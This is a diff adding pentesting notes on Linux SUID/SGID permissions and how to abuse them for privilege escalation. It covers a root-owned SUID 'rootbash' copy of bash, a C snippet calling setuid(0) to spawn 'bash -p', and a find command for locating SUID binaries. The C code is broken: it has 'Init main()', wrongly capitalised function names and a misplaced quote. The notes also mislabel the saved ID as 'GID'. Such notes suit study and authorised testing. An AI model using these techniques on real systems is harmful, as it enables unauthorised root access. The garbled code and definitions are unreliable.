@@ -1,5 +1,41 @@
 # SUID
 
+## **Setuid \(SUID\)**
+
+If SUID is set, the file will be executed with the privilege of the file user.
+
+## **Setgid \(SGID\)**
+
+File: the file will be executed with the privilege of the filegroup. Directory: files created within that dir will inherit group privilege.
+
+These permissions are represented by the 'execute' part, and when set it will be 's'.
+
+Each User has 3 user ids:
+
+* Real id: UID
+* EffectiveID: EUID
+* SavedID: GID
+
+### Usages
+
+#### Rootbash SUID:
+
+Copy of `/bin/bash` as `rootbash`, and make sure it's owned by root and suid is set.
+
+Now it can be executed as `rootbash -p`
+
+Custom:
+
+```text
+Init main() {
+	Setuid(0);
+	System("/bin/bash" -p)
+}
+
+#Compile
+Gcc -o <name> <code_filename.c>
+```
+
 #### Find files by permissions type
 
 `find / -perm -u=s -type f 2>/dev/null`
